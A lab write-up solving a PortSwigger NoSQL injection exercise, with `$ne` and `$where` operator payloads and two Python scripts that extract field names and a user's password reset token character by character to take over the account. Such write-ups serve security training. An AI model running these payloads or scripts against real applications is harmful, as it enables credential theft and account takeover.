# Exploiting NoSQL operator injection to extract unknown fields

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields), you'll learn: Exploiting NoSQL operator injection to extract unknown fields! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to [NoSQL injection](https://portswigger.net/web-security/nosql-injection).

To solve the lab, log in as `carlos`.

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010132144.png)

In here, we can purchase some products.

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010132156.png)

In here, we can login to an account or **reset password for a user**.

**The "Forgot password?" link:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010132548.png)

**Let's try to enter a random username like `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010132621.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010132635.png)

When we clicked the "Submit" button, the web application will **send a reset password link to the email that ties to the account**.

Hmm... Usually the reset password works like this:

1. Generate a unique token and insert it to the database
2. Send the reset password link to the user's email. The link should contains the token's value
3. When the user clicked on that link, the web application will verify the token is legit and valid with the database's inserted token
4. If the token is valid, reset the user's password

Let's keep this in mind and move forward.

**Login page view source:**
```html
[...]
<section>
    <form class=login-form method=POST action="/login">
        <label>Username</label>
        <input required type=username name="username" autofocus>
        <label>Password</label>
        <input required type=password name="password">
        <a href=/forgot-password>Forgot password?</a>
        <br/>
        <button class=button onclick="event.preventDefault(); jsonSubmit('/login')"> Log in </button>
        <script src='/resources/js/login.js'></script>
    </form>
</section>
[...]
```

In here, this page has imported a JavaScript file called `login.js` from `/resources/js/`.

**`login.js`:**
```javascript
function jsonSubmit(loginPath) {
    const formToJSON = elements => [].reduce.call(elements, (data, element) => {
        if (element.name && element.name.length > 0) {
            data[element.name] = element.value;
        }
        return data;
    }, {});

    const jsonObject = formToJSON(document.getElementsByClassName("login-form")[0].elements)
    const formData = JSON.stringify(jsonObject);
    fetch(
        loginPath,
        {
            method: "POST",
            body: formData,
            headers: {
                "Content-Type": "application/json"
            },
        }
    )
        .then(response => {
            response.text().then(t => {
                document.open();
                document.write(t);
                document.close();
            });

            if (response.redirected) {
                history.pushState({}, "", response.url)
            }
        });
}
```

When we clicked the "Log in" button, **it'll send a POST request to `/login` with `username` and `password` data in JSON format.**

**Let's try to login as an invalid user and see the request in Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010133541.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010133553.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010133607.png)

Then, send this request to Burp Repeater and try to find **NoSQL injection** vulnerability.

First, we can try to perform authentication bypass via **NoSQL injection's operator injection**:

```json
{
    "username": "carlos",
    "password":{
        "$ne": "foobar"
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010134004.png)

Wait what? "Account locked: please reset your password"??

Hmm... Looks like **the login endpoint is vulnerable to NoSQL injection's operator injection**. However, `carlos`'s account is locked...

## Exploitation

Ah ha! **Maybe we need to extract the value of the reset password token from the database?** But how?

**Identifying field names:**

Because MongoDB handles semi-structured data that doesn't require a fixed schema, you may need to identify valid fields in the collection before you can extract data using JavaScript injection.

For example, to identify whether the MongoDB database contains a `password` field, you could submit the following payload:

```
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the `username` field exists, so you could send the following payloads:

```
admin' && this.username!=' 
```

```
admin' && this.foo!='
```

If the `password` field exists, you'd expect the response to be identical to the response for the existing field (`username`), but different to the response for the field that doesn't exist (`foo`).

If you want to test different field names, you could perform a dictionary attack, by using a wordlist to cycle through different potential field names.

> **Note:**
>  
> You can alternatively use NoSQL operator injection to extract field names character by character. This enables you to identify field names without having to guess or perform a dictionary attack.

**Exploiting NoSQL operator injection to extract data:**

Even if the original query doesn't use any operators that enable you to run arbitrary JavaScript, you may be able to inject one of these operators yourself. You can then use boolean conditions to determine whether the application executes any JavaScript that you inject via this operator.

**Injecting operators in MongoDB:**

Consider a vulnerable application that accepts username and password in the body of a `POST` request:

```json
{"username":"wiener","password":"peter"}
```

To test whether you can inject operators, you could try adding the `$where` operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true. For example:

```json
{"username":"wiener","password":"peter", "$where":"0"}
```

```json
{"username":"wiener","password":"peter", "$where":"1"}
```

If there is a difference between the responses, this may indicate that the JavaScript expression in the `$where` clause is being evaluated.

**Extracting field names:**

If you have injected an operator that enables you to run JavaScript, you may be able to use the `keys()` method to extract the name of data fields. For example, you could submit the following payload:

```javascript
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

This inspects the first data field in the user object and returns the first character of the field name. This enables you to extract the field name character by character.

**Armed with above information, we can try to inject the `$where` operator and see what will happen:**
```json
{
    "username": "carlos",
    "password":{
        "$ne": "foobar"
    },
    "$where": "0"
}
```

```json
{
    "username": "carlos",
    "password":{
        "$ne": "foobar"
    },
    "$where": "1"
}
```

When we use `"$where": "0"`, it'll be evaluated as `False`, and  `"$where": "1"` will be evaluated as `True`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010135023.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010135034.png)

In here, we can see that the `0` is evaluated as `False`, which means the login was failed. In `1`, it got "Account locked", which means the login was successfully.

That being said, **the JavaScript expression in the `$where` clause is being evaluated.**

**After that, we can extract field names via `"$where": "Object.keys(this)[0].match('^.{0}a.*')"`:**
```json
{
    "username": "carlos",
    "password":{
        "$ne": "foobar"
    },
    "$where": "Object.keys(this)[0].match('^.{0}a.*')"
}
```

> Note: The JavaScript `match()` function's regex can be `<found_character>.*`.

**But before we do that, let's generate a password reset token for user `carlos`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010135904.png)

**Next, to automate this process, I'll write a Python script:**
```python
import requests
from string import ascii_letters

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl

    def extractFieldNames(self, fieldPosition):
        LOGIN_ENDPOINT = '/login'
        LAST_CHARACTER = ascii_letters[-1]
        username = 'carlos'
        password = {
            '$ne': 'foobar'
        }
        fieldName = str()
        while True:
            for character in ascii_letters:
                payload = f'^{fieldName}{character}.*' if fieldName else f'^{character}.*'
                whereOperatorKey = f'Object.keys(this)[{fieldPosition}].match("{payload}")'
                print(f'[*] Sending payload: {whereOperatorKey}', end='\r')

                loginData = {
                    'username': username,
                    'password': password,
                    '$where': whereOperatorKey
                }
                loginRespond = requests.post(f'{self.baseUrl}{LOGIN_ENDPOINT}', json=loginData)
                isValidCharacter = False if 'Invalid username' in loginRespond.text else True
                isLastCharacter = character == LAST_CHARACTER
                isEmptyFieldName = True if len(fieldName) == 0 else False

                if not isValidCharacter and isLastCharacter and isEmptyFieldName:
                    print(f'[-] Looped through all possible characters, no luck. This field position {fieldPosition} doesn\'t have a field?')
                    return
                if not isValidCharacter and isLastCharacter:
                    print('[-] Looped through all possible characters, no luck. Maybe we found all the characters?')
                    print(f'[*] Field name: {fieldName}')
                    return
                if isValidCharacter:
                    fieldName += character
                    print(f'\n[+] Found valid character "{character}" on field position {fieldPosition}')
                    break

if __name__ == '__main__':
    baseUrl = 'https://0a5d009d04e55d29804112b8009f007b.web-security-academy.net'
    exploit = Exploit(baseUrl)

    # you can change your minimum/maximum field position here
    MINIMUM_FIELD_POSITION = 0
    MAXIMUM_FIELD_POSITION = 4
    for fieldPosition in range(MINIMUM_FIELD_POSITION, MAXIMUM_FIELD_POSITION):
        exploit.extractFieldNames(fieldPosition)
```

```shell
┌[siunam♥Mercury]-(~/ctf/Portswigger-Labs/NoSQL-Injection/NoSQLi-4)-[2023.10.10|15:17:08(HKT)]
└> python3 extract_field_names.py
[-] Looped through all possible characters, no luck. This field position 0 doesn't have a field?
[*] Sending payload: Object.keys(this)[1].match("^u.*")
[+] Found valid character "u" on field position 1
[*] Sending payload: Object.keys(this)[1].match("^us.*")
[+] Found valid character "s" on field position 1
[*] Sending payload: Object.keys(this)[1].match("^use.*")
[+] Found valid character "e" on field position 1
[*] Sending payload: Object.keys(this)[1].match("^user.*")
[+] Found valid character "r" on field position 1
[*] Sending payload: Object.keys(this)[1].match("^usern.*")
[+] Found valid character "n" on field position 1
[*] Sending payload: Object.keys(this)[1].match("^userna.*")
[+] Found valid character "a" on field position 1
[*] Sending payload: Object.keys(this)[1].match("^usernam.*")
[+] Found valid character "m" on field position 1
[*] Sending payload: Object.keys(this)[1].match("^username.*")
[+] Found valid character "e" on field position 1
[-] Looped through all possible characters, no luck. Maybe we found all the characters?
[*] Field name: username
[*] Sending payload: Object.keys(this)[2].match("^p.*")
[+] Found valid character "p" on field position 2
[...]
[*] Sending payload: Object.keys(this)[2].match("^password.*")
[+] Found valid character "d" on field position 2
[-] Looped through all possible characters, no luck. Maybe we found all the characters?
[*] Field name: password
[*] Sending payload: Object.keys(this)[3].match("^p.*")
[+] Found valid character "p" on field position 3
[...]
[*] Sending payload: Object.keys(this)[3].match("^pwResetTkn.*")
[+] Found valid character "n" on field position 3
[-] Looped through all possible characters, no luck. Maybe we found all the characters?
[*] Field name: pwResetTkn
```

Nice! We extracted 3 fields: **`username`, `password`, and `pwResetTkn`.**

Hmm... **The `pwResetTkn` sounds like password reset token.**

**That being said, let's extract the password reset token for user `carlos`!**

**This time, we can use the field name and `match()` JavaScript function as our payload:**
```javascript
this.pwResetTkn[0].match('<character_here>.*')
```

**Or, we can use:**
```javascript
this.pwResetTkn[<character_index>] == '<character>'
```

If the character is correct, it'll response "Account locked: please reset your password". Otherwise response "Invalid username or password".

Since I used the first method in extracting field names, I'll try to use the second method.

**To do so, I'll modify the Python script:**
```python
import requests
from string import ascii_letters, digits

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.LOGIN_ENDPOINT = '/login'
        self.USERNAME = 'carlos'
        self.PASSWORD = {
            '$ne': 'foobar'
        }
        self.CHARACTER_SET = ascii_letters + digits
        self.LAST_CHARACTER = self.CHARACTER_SET[-1]

    def extractFieldNames(self, fieldPosition):
        fieldName = str()
        while True:
            for character in self.CHARACTER_SET:
                payload = f'^{fieldName}{character}.*' if fieldName else f'^{character}.*'
                whereOperatorKey = f'Object.keys(this)[{fieldPosition}].match("{payload}")'
                print(f'[*] Sending payload: {whereOperatorKey}', end='\r')

                loginData = {
                    'username': self.USERNAME,
                    'password': self.PASSWORD,
                    '$where': whereOperatorKey
                }
                loginRespond = requests.post(f'{self.baseUrl}{self.LOGIN_ENDPOINT}', json=loginData)
                isValidCharacter = False if 'Invalid username' in loginRespond.text else True
                isEmptyFieldName = True if len(fieldName) == 0 else False
                isLastCharacter = character == self.LAST_CHARACTER

                if not isValidCharacter and isLastCharacter and isEmptyFieldName:
                    print(f'[-] Looped through all possible characters, no luck. This field position {fieldPosition} doesn\'t have a field?')
                    return
                if not isValidCharacter and isLastCharacter:
                    print('[-] Looped through all possible characters, no luck. Maybe we found all the characters?')
                    print(f'[*] Field name: {fieldName}')
                    return
                if isValidCharacter:
                    fieldName += character
                    print(f'\n[+] Found valid character "{character}" on field position {fieldPosition}')
                    break

    def extractFieldData(self, fieldName):
        username = 'carlos'
        password = {
            '$ne': 'foobar'
        }
        characterIndex = 0
        foundResetToken = str()
        while True:
            for character in self.CHARACTER_SET:
                payload = f'this.pwResetTkn[{characterIndex}] == "{character}"'
                print(f'[*] Trying payload: {payload}', end='\r')
                loginData = {
                    'username': self.USERNAME,
                    'password': self.PASSWORD,
                    '$where': payload
                }
                loginRespond = requests.post(f'{self.baseUrl}{self.LOGIN_ENDPOINT}', json=loginData)
                isValidCharacter = False if 'Invalid username' in loginRespond.text else True
                isLastCharacter = character == self.LAST_CHARACTER

                if not isValidCharacter and isLastCharacter:
                    print('[-] Looped through all possible characters, no luck. Maybe we found all the characters?')
                    print(f'[*] Password reset token: {foundResetToken}')
                    return
                if isValidCharacter:
                    foundResetToken += character
                    print(f'\n[+] Found valid character "{character}" on character position {characterIndex}')
                    characterIndex += 1
                    break

if __name__ == '__main__':
    baseUrl = 'https://0a5d009d04e55d29804112b8009f007b.web-security-academy.net'
    exploit = Exploit(baseUrl)

    # you can change your minimum/maximum field position here
    # MINIMUM_FIELD_POSITION = 0
    # MAXIMUM_FIELD_POSITION = 4
    # for fieldPosition in range(MINIMUM_FIELD_POSITION, MAXIMUM_FIELD_POSITION):
    #     exploit.extractFieldNames(fieldPosition)

    FIELD_NAME = 'pwResetTkn'
    exploit.extractFieldData(FIELD_NAME)
```

```shell
┌[siunam♥Mercury]-(~/ctf/Portswigger-Labs/NoSQL-Injection/NoSQLi-4)-[2023.10.10|15:52:02(HKT)]
└> python3 extract_field_names.py
[*] Trying payload: this.pwResetTkn[0] == "e"
[+] Found valid character "e" on character position 0
[*] Trying payload: this.pwResetTkn[1] == "6"
[+] Found valid character "6" on character position 1
[...]
[*] Trying payload: this.pwResetTkn[15] == "9"
[+] Found valid character "9" on character position 15
[-] Looped through all possible characters, no luck. Maybe we found all the characters?
[*] Password reset token: e6190495b173daa9
```

Now that we have the password reset token for user `carlos`!

But... Where does the password reset token can be used? **Maybe it's at endpoint `/forgot-password`?**

**After some educated guessing, I found that the password reset token field name `pwResetTkn` is the validating tokens' GET parameter!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010161738.png)

**Let's provide the correct token in the `pwResetTkn` parameter!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010161830.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010161841.png)

Then, we can **reset `carlos`'s password via sending a POST request to `/forgot-password` with parameter `csrf`, `pwResetTkn`, `new-password-1`, and `new-password-2`.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010162036.png)

**Finally, we should be able to login as `carlos` with the new password:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010162104.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-4/images/Pasted%20image%2020231010162111.png)

## Conclusion

What we've learned:

1. Exploiting NoSQL operator injection to extract unknown fields